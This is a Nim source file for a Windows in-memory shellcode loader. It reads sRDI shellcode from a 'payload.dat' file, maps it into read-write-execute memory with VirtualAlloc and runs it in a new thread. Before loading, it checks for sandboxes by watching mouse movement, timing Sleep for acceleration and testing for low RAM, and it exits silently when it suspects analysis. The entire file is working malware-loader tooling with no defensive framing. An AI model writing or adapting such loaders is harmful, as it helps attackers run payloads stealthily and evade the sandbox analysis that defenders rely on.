import winim/lean
import std/os

# Runner Executable (Reflective Loader)
# Purpose: Load the sRDI shellcode (converted DLL) into memory and execute it.
# This avoids dropping the DLL to disk in a way that LoadLibrary would use.
# The shellcode is position-independent and handles its own imports.

proc checkSandbox(): bool =
    # 1. Check if mouse cursor position changes (Human Interaction Check)
    # Most automated sandboxes don't move the mouse.
    var p1, p2: POINT
    GetCursorPos(addr p1)
    Sleep(2000)
    GetCursorPos(addr p2)
    
    if p1.x == p2.x and p1.y == p2.y:
        # Mouse didn't move in 2 seconds. Suspicious but might just be idle user.
        # Let's try a sleep acceleration check.
        
        # 2. Sleep Acceleration Check
        # Sandboxes often fast-forward Sleep() to save analysis time.
        let t1 = GetTickCount()
        Sleep(1000)
        let t2 = GetTickCount()
        
        # If the difference is significantly less than 1000ms, time was accelerated.
        if (t2 - t1) < 900:
            return true # Detected sandbox (Time acceleration)
            
    # 3. Check for low resources (typical VM/Sandbox specs)
    var memStatus: MEMORYSTATUSEX
    memStatus.dwLength = sizeof(memStatus).DWORD
    GlobalMemoryStatusEx(addr memStatus)
    
    # If less than 2GB RAM, likely a sandbox
    if memStatus.ullTotalPhys < 2 * 1024 * 1024 * 1024:
        return true
        
    return false

proc main() =
  # Anti-Sandbox Check
  if checkSandbox():
      return

  # 1. Determine paths
  var szPath: array[MAX_PATH, char]
  GetModuleFileNameA(0, addr szPath[0], MAX_PATH)
  let currentExe = $cast[cstring](addr szPath[0])
  let currentDir = splitFile(currentExe).dir
  
  # The payload shellcode is named "payload.dat" by the loader
  let shellcodeFile = currentDir & "\\payload.dat"
  
  if not fileExists(shellcodeFile):
    return

  try:
    # 2. Read Shellcode
    let shellcode = readFile(shellcodeFile)
    if shellcode.len == 0:
      return

    # 3. Allocate Memory (RWX)
    # Using VirtualAlloc to allocate memory for the shellcode
    let pMemory = VirtualAlloc(
      nil, 
      cast[SIZE_T](shellcode.len), 
      MEM_COMMIT or MEM_RESERVE, 
      PAGE_EXECUTE_READWRITE
    )
    
    if pMemory == nil:
      return

    # 4. Write Shellcode to Memory
    copyMem(pMemory, unsafeAddr shellcode[0], shellcode.len)

    # 5. Execute Shellcode
    # Create a thread to execute the shellcode
    # The sRDI shellcode entry point expects to be called (or jumped to).
    # CreateThread calls it with a parameter, but sRDI handles the bootstrap.
    var threadId: DWORD
    let hThread = CreateThread(
      nil, 
      0, 
      cast[LPTHREAD_START_ROUTINE](pMemory), 
      nil, 
      0, 
      addr threadId
    )

    if hThread != 0:
      # Wait for the thread (DLLMain + Run)
      # Since 'Run' runs a loop, we wait indefinitely or let the main thread loop too.
      # If we exit main(), the process dies.
      WaitForSingleObject(hThread, INFINITE)
      CloseHandle(hThread)
      
  except:
    discard

when isMainModule:
  main()
